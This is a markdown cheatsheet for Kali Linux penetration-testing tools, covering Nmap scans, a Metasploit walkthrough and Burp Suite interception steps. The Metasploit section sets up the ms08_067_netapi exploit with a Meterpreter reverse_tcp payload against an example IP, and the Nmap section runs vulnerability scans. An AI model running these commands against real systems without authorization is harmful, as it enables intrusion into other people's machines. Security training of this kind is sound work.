# 🛠️ Kali Linux Tools (Nmap, Metasploit, Burp Suite) Comprehensive Cheatsheet

## 🔹 Introduction
Kali Linux is a **penetration testing** and **ethical hacking** distribution equipped with powerful security tools like **Nmap, Metasploit, and Burp Suite**.

---

## 🔹 Nmap (Network Mapper)
### ✅ Basic Scanning
```sh
# Scan a single target
nmap example.com

# Scan multiple targets
nmap 192.168.1.1 192.168.1.2

# Scan a range of IPs
nmap 192.168.1.0/24
```

### 📌 Advanced Scanning
```sh
# Scan with OS detection, version detection, script scanning, and traceroute
nmap -A example.com

# Scan for specific ports
nmap -p 22,80,443 example.com

# Scan all 65,535 ports
nmap -p- example.com
```

### 📌 Vulnerability Scanning
```sh
# Scan for known vulnerabilities
nmap --script vuln example.com
```

---

## 🔹 Metasploit Framework (msfconsole)
### ✅ Start Metasploit
```sh
msfconsole
```

### 📌 Searching for Exploits
```sh
# Search for exploits related to Apache
search apache

# Show detailed information about an exploit
info exploit/unix/ftp/vsftpd_234_backdoor
```

### 📌 Using an Exploit
```sh
# Select an exploit
use exploit/windows/smb/ms08_067_netapi

# Show required options
show options

# Set target IP
set RHOSTS 192.168.1.100

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Execute the exploit
exploit
```

### 📌 Post-Exploitation
```sh
# List active sessions
sessions -l

# Interact with a session
sessions -i 1
```

---

## 🔹 Burp Suite (Web Application Security)
### ✅ Intercepting HTTP Requests
1. Open **Burp Suite** and go to **Proxy > Intercept**.
2. Enable **Intercept is on**.
3. Configure **browser proxy settings** to `127.0.0.1:8080`.

### 📌 Scanning for Vulnerabilities
1. Navigate to **Target > Site Map**.
2. Right-click the target and select **Active Scan**.

### 📌 Exploiting with Repeater
1. Go to **Repeater**.
2. Modify HTTP requests manually.
3. Send requests and analyze responses.

### 📌 Burp Suite Common Shortcuts
| Action | Shortcut |
|--------|----------|
| Send to Repeater | Ctrl + R |
| Send to Intruder | Ctrl + I |
| Forward Request | Ctrl + F |
| Drop Request | Ctrl + D |

---

## 🔹 Best Practices
- **Use Nmap for reconnaissance** before launching attacks.
- **Metasploit should only be used ethically** and with permission.
- **Burp Suite helps analyze web vulnerabilities** in-depth.
- **Keep Kali Linux tools updated** for the latest security patches.

---
